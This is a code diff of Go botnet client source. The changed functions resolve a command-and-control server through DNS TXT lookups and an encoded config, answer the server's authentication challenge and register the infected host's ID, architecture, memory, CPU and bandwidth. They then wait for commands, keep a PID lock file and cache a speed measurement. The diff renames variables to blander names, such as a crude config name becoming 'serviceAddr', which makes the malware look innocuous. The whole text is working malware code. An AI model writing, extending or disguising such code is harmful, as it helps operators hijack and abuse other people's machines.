@@ -91,7 +91,7 @@ func revilProc() string {
 // Returns: true after acquiring the lock (old instance killed if needed).
 func revilSingleInstance() bool {
 	// Try to read existing lock file
-	if data, err := os.ReadFile(instanceLockPath); err == nil {
+	if data, err := os.ReadFile(lockLoc); err == nil {
 		val := strings.TrimSpace(string(data))
 		if pid, err := strconv.Atoi(val); err == nil && pid > 0 && pid != os.Getpid() {
 			// Check if PID is still alive (signal 0 = existence check)
@@ -114,7 +114,7 @@ func revilSingleInstance() bool {
 	}
 
 	// Write our PID to the lock file
-	os.WriteFile(instanceLockPath, []byte(strconv.Itoa(os.Getpid())), 0600)
+	os.WriteFile(lockLoc, []byte(strconv.Itoa(os.Getpid())), 0600)
 	deoxys("revilSingleInstance: Lock acquired (PID %d)", os.Getpid())
 	return true
 }
@@ -125,7 +125,7 @@ func revilSingleInstance() bool {
 // Returns: Speed in Mbps (float64)
 func revilUplinkCached() float64 {
 	// Try to read cached result first
-	if data, err := os.ReadFile(speedCachePath); err == nil {
+	if data, err := os.ReadFile(cacheLoc); err == nil {
 		val := strings.TrimSpace(string(data))
 		if speed, err := strconv.ParseFloat(val, 64); err == nil && speed > 0 {
 			deoxys("revilUplinkCached: Using cached speed: %.2f Mbps", speed)
@@ -139,7 +139,7 @@ func revilUplinkCached() float64 {
 
 	// Save result to cache file
 	if speed > 0 {
-		os.WriteFile(speedCachePath, []byte(fmt.Sprintf("%.2f", speed)), 0600)
+		os.WriteFile(cacheLoc, []byte(fmt.Sprintf("%.2f", speed)), 0600)
 		deoxys("revilUplinkCached: Saved speed cache: %.2f Mbps", speed)
 	}
 
@@ -226,7 +226,7 @@ func anonymousSudan(conn net.Conn) {
 	challenge := strings.TrimPrefix(challengeMsg, "AUTH_CHALLENGE:")
 	challenge = strings.TrimSpace(challenge)
 	deoxys("anonymousSudan: Challenge extracted: %s", challenge)
-	response := hafnium(challenge, magicCode)
+	response := hafnium(challenge, syncToken)
 	deoxys("anonymousSudan: Sending auth response...")
 	conn.Write([]byte(response + "\n"))
 	conn.SetReadDeadline(time.Now().Add(10 * time.Second))
@@ -241,7 +241,7 @@ func anonymousSudan(conn net.Conn) {
 	deoxys("anonymousSudan: Registering - BotID: %s, Arch: %s, RAM: %d MB, CPU: %d cores, Proc: %s, Uplink: %.2f Mbps",
 		cachedBotID, cachedArch, cachedRAM, cachedCPU, cachedProc, cachedUplink)
 	conn.Write([]byte(fmt.Sprintf("REGISTER:%s:%s:%s:%d:%d:%s:%.2f\n",
-		protocolVersion, cachedBotID, cachedArch, cachedRAM, cachedCPU, cachedProc, cachedUplink)))
+		buildTag, cachedBotID, cachedArch, cachedRAM, cachedCPU, cachedProc, cachedUplink)))
 	deoxys("anonymousSudan: Entering command loop...")
 	for {
 		conn.SetReadDeadline(time.Now().Add(180 * time.Second))
@@ -283,8 +283,8 @@ func anonymousSudan(conn net.Conn) {
 // Returns: C2 address string (IP:PORT) or error
 func darkrai(domain string) (string, error) {
 	deoxys("darkrai: Looking up TXT for domain: %s", domain)
-	servers := make([]string, len(lizardSquad))
-	copy(servers, lizardSquad)
+	servers := make([]string, len(resolverPool))
+	copy(servers, resolverPool)
 	rand.Shuffle(len(servers), func(i, j int) {
 		servers[i], servers[j] = servers[j], servers[i]
 	})
@@ -530,7 +530,7 @@ func arceus(h string) bool {
 // Returns: C2 address in "IP:PORT" format, or empty string on total failure
 func dialga() string {
 	deoxys("dialga: Starting C2 resolution")
-	decoded := venusaur(gothTits)
+	decoded := venusaur(serviceAddr)
 	deoxys("dialga: Decoded config: '%s'", decoded)
 	if decoded == "" {
 		deoxys("dialga: Failed to decode config, returning empty")
